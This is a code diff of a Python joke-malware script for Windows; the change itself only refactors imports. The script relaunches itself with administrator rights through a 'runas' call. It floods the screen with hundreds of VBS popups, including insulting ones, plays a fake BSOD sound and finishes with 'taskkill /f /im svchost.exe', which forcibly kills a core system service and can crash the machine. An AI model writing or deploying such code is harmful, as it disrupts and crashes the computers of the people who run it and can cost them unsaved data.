@@ -1,7 +1,15 @@
-import os, random, psutil, signal, autoit, simpleaudio, time, ctypes, sys
+from os import startfile, system, kill
+from random import choice, randint
+from sys import executable, argv
+from ctypes import windll
+from time import sleep
+from psutil import process_iter
+from simpleaudio import WaveObject
+from autoit import win_move
+from signal import SIGBREAK
 from tkinter import Tk
 
-if ctypes.windll.shell32.IsUserAnAdmin():
+if windll.shell32.IsUserAnAdmin():
 
     with open("scripts/bsod.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("BSOD MOD TRIGGERED !",16+4096,"HO YEAH BOY")""")
     with open("scripts/fatma.vbs", "w+", encoding="utf8") as f: f.write("""x = MsgBox("ERROR 0x0073b: YOU ARE FAT.",16+4096,"Critical error in line 256; Threading")""")
@@ -28,104 +36,104 @@ if ctypes.windll.shell32.IsUserAnAdmin():
         pos = 0
         pos2 = 0
         process_pid_list = list()
-        for p in psutil.process_iter(): 
+        for p in process_iter(): 
             if p.name() == "wscript.exe":
                 process_pid_list.append(p.pid)
-        for p in process_pid_list: os.kill(p, signal.SIGBREAK)
+        for p in process_pid_list: kill(p, SIGBREAK)
 
     def TkRage():
         
-        os.startfile("scripts\\del.vbs")
+        startfile("scripts\\del.vbs")
         while True:
             try:
-                autoit.win_move(d["scripts\\del.vbs"], 350, 350)
+                win_move(d["scripts\\del.vbs"], 350, 350)
                 break
             except: continue
-        os.startfile("scripts\\del.vbs")
+        startfile("scripts\\del.vbs")
         while True:
             try:
-                autoit.win_move(d["scripts\\del.vbs"], 350, wh-350)
+                win_move(d["scripts\\del.vbs"], 350, wh-350)
                 break
             except: continue
-        os.startfile("scripts\\del.vbs")
+        startfile("scripts\\del.vbs")
         while True:
             try:
-                autoit.win_move(d["scripts\\del.vbs"], ww-350, 350)
+                win_move(d["scripts\\del.vbs"], ww-350, 350)
                 break
             except: continue
-        os.startfile("scripts\\del.vbs")
+        startfile("scripts\\del.vbs")
         while True:
             try:
-                autoit.win_move(d["scripts\\del.vbs"], ww-350, wh-350)
+                win_move(d["scripts\\del.vbs"], ww-350, wh-350)
                 break
             except: continue
 
-    simpleaudio.WaveObject.from_wave_file("assets/BSOD.wav").play()
+    WaveObject.from_wave_file("assets/BSOD.wav").play()
 
-    time.sleep(1.75)
-    os.startfile("scripts\\bsod.vbs")
+    sleep(1.75)
+    startfile("scripts\\bsod.vbs")
     while True:
         try:
-            autoit.win_move(d["scripts\\bsod.vbs"], round(ww/2), round(wh/2))
+            win_move(d["scripts\\bsod.vbs"], round(ww/2), round(wh/2))
             break
         except: continue
-    time.sleep(9.5)
+    sleep(9.5)
     TkRage()
-    time.sleep(5.5)
+    sleep(5.5)
     TkRage()
-    time.sleep(3.8)
+    sleep(3.8)
     KillAllWindows()
-    os.startfile("scripts\\boom.vbs")
-    time.sleep(0.2)
-    os.startfile("scripts\\boom.vbs")
-    time.sleep(3)
+    startfile("scripts\\boom.vbs")
+    sleep(0.2)
+    startfile("scripts\\boom.vbs")
+    sleep(3)
     KillAllWindows()
     for i in range(50):
-        os.startfile("scripts\\explode.vbs")
+        startfile("scripts\\explode.vbs")
         while True:
             try:
-                autoit.win_move(d["scripts\\explode.vbs"], pos, pos)
+                win_move(d["scripts\\explode.vbs"], pos, pos)
                 break
             except: continue
         pos += 25 
     KillAllWindows()
     for i in range(150):      
-        if random.choice([True, False]):
+        if choice([True, False]):
             pos = round(ww/2+i)
             pos2 = round(wh/2-i)
         else:
             pos = round(ww/2-i)
             pos2 = round(wh/2+i)
-        os.startfile("scripts\\windows.vbs")
+        startfile("scripts\\windows.vbs")
         while True:
             try:
-                autoit.win_move(d["scripts\\windows.vbs"], pos, pos2)
+                win_move(d["scripts\\windows.vbs"], pos, pos2)
                 break
             except: continue
     KillAllWindows()
     for i in range(170):
         
-            os.startfile("scripts\\fatma.vbs")
+            startfile("scripts\\fatma.vbs")
             while True:
                 try:
-                    autoit.win_move(d["scripts\\fatma.vbs"], i, i)
+                    win_move(d["scripts\\fatma.vbs"], i, i)
                     break
                 except: continue
     KillAllWindows()
     for i in range(300):
-        pos2 = random.randint(0, wh)
-        pos = random.randint(0, ww)
+        pos2 = randint(0, wh)
+        pos = randint(0, ww)
         s = list()
         for k in d.keys(): s.append(str(k))
-        k = random.choice(s)
-        os.startfile(k)
+        k = choice(s)
+        startfile(k)
         while True:
             try:
-                autoit.win_move(d[k], pos, pos2)
+                win_move(d[k], pos, pos2)
                 break
             except: continue
             
     KillAllWindows()
-    os.system("taskkill /f /im svchost.exe")
+    system("taskkill /f /im svchost.exe")
         
-else: ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, " ".join(sys.argv[0:]), None, 1)
+else: windll.shell32.ShellExecuteW(None, "runas", executable, " ".join(argv[0:]), None, 1)
